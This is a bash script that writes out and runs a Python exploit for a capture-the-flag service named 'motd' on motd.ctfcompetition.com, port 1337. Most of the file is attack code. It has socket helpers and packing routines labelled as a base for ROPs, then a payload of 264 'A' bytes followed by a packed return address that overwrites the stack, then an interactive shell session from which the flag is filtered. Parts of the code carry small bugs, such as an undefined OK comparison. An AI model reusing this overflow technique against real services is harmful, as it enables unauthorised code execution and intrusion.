#!/bin/bash

# If there is no directory called tmp
if [ ! -d tmp ]
then
  # Create a dir called tmp
  mkdir tmp
else
  # Else, delete the contents
  rm -r tmp/*
fi

# Go to the tmp folder
cd tmp/

echo '

#!/usr/bin/python
import os
import random
import socket
import sys
import telnetlib
import threading
import time
from struct import pack, unpack
from time import time


def recvuntil(sock, txt):
    d = ""
    while d.find(txt) == -1:
        try:
            dnow = sock.recv(1)
            if len(dnow) == 0:
                return ("DISCONNECTED", d)
        except socket.timeout:
            return ("TIMEOUT", d)
        except socket.error as msg:
            return ("ERROR", d)
        d += dnow
    return ("OK", d)


def recvall(sock, n):
    d = ""
    while len(d) != n:
        try:
            dnow = sock.recv(n - len(d))
            if len(dnow) == 0:
                return ("DISCONNECTED", d)
        except socket.timeout:
            return ("TIMEOUT", d)
        except socket.error as msg:
            return ("ERROR", d)
        d += dnow
    return ("OK", d)

# Proxy object for sockets.


class gsocket(object):
    def __init__(self, *p):
        self._sock = socket.socket(*p)

    def __getattr__(self, name):
        return getattr(self._sock, name)

    def recvall(self, n):
        err, ret = recvall(self._sock, n)
        if err != OK:
            return False
        return ret

    def recvuntil(self, txt):
        err, ret = recvuntil(self._sock, txt)
        if err != "OK":
            return False
        return ret

# Base for any of my ROPs.


def db(v):
    return pack("<B", v)


def dw(v):
    return pack("<H", v)


def dd(v):
    return pack("<I", v)


def dq(v):
    return pack("<Q", v)


def rb(v):
    return unpack("<B", v[0])[0]


def rw(v):
    return unpack("<H", v[:2])[0]


def rd(v):
    return unpack("<I", v[:4])[0]


def rq(v):
    return unpack("<Q", v[:8])[0]


def go():
    global HOST
    global PORT
    s = gsocket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))

    # Put your code here!
    s.sendall(b"2\n")
    newmotd = (b"A" * (256 + 8)) + dq(0x00606063A5)
    s.sendall(newmotd + b"\n")

    # Interactive sockets.
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

    # Python console.
    # Note: you might need to modify ReceiverClass if you want
    #       to parse incoming packets.
    # ReceiverClass(s).start()
    #dct = locals()
    # for k in globals().keys():
    #  if k not in dct:
    #    dct[k] = globals()[k]
    # code.InteractiveConsole(dct).interact()

    s.close()


HOST = "motd.ctfcompetition.com"
PORT = 1337
go()

' > tmp.py

# python tmp.py | tail -2 | head -n 1
python3.6 tmp.py | awk '/CTF/{print $4}' 


# Clean up
cd ..
rm -r tmp
